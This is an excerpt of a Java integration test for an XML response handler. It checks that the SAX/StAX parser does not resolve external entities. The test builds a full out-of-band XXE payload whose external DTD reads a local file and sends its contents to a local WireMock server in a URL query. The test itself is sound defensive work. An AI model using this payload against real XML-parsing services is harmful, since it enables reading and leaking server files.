...
public class StaxResponseHandlerIntegrationTest {
    ...
    public void saxParserShouldNotExposeLocalFileSystem() throws Exception {
        ...
        String payload =
                "<?xml version=\"1.0\" ?> \n"
                        + "<!DOCTYPE a [ \n"
                        + "<!ENTITY % asd SYSTEM \"http://127.0.0.1:"
                        + wireMockServer.port()
                        + "/payload.dtd\"> \n"
                        + "%asd; \n"
                        + "%c; \n"
        ...
        String entityString =
                "<!ENTITY % file SYSTEM \"file://"
                        ...
                        + "\"> \n"
                        + "<!ENTITY % c \"<!ENTITY rrr SYSTEM 'http://127.0.0.1:"
                        + wireMockServer.port()
                        + "/?%file;'>\">";
        ...
        StaxResponseHandler<String> responseHandler =
                new StaxResponseHandler<String>(dummyUnmarshaller());

        HttpResponse response = mock(HttpResponse.class);
        when(response.getContent())
                .thenReturn(new ByteArrayInputStream(payload.getBytes(Charset.forName("UTF-8"))));
        ...
        WireMock.verify(
                getRequestedFor(
                        urlPathEqualTo(
                                "/?hello-world"))); // We expect this to fail, this call should not
        // be made
    }
